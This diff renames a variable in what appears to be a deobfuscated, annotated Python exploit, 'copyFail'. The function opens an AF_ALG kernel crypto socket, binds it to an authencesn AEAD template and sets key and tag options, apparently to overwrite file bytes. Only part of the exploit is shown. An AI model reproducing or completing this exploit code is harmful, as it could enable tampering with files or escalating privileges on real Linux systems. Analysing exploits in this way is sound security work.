@@ -17,7 +17,7 @@ Variable Translations
 
 Parameters (f,t,c) --> (file,index,byteData)
 
-a = ALFSocket
+a = ALGSocket
 h = sockLevel
 v = sockOptObj
 u = client
@@ -29,19 +29,19 @@ n = fdSplice
 '''
 def copyFail(file, index, byteData):
     #socket family=38 (AF_ALG), type=5 (SOCK_SEQPACKET) , protocol=0 (default)
-    ALFSocket = socket.socket(38, 5, 0)
+    ALGSocket = socket.socket(38, 5, 0)
     #bind to authencesn AEAD template
-    ALFSocket.bind(("aead",
+    ALGSocket.bind(("aead",
                     "authencesn(hmac(sha256),cbc(aes))"))
 
     sockLevel = 279 #exploit uses socket level 279
-    sockOptObj = ALFSocket.setsockopt
+    sockOptObj = ALGSocket.setsockopt
     #level=279, optname=1 (ALG_SET_KEY), optval=bytes (key for authencesn)
     sockOptObj(sockLevel, 1, toBytes('0800010000000010'+'0'*64))
     #level=279, optname=5 (ALG_SET_AEAD_AUTHSIZE), set to 4 byte tag
     sockOptObj(sockLevel, 5, None, 4)
     
-    client, addr = ALFSocket.accept()
+    client, addr = ALGSocket.accept()
     
     offset = index+4 #increment by 4 bytes of payload
     zeros = toBytes('00')
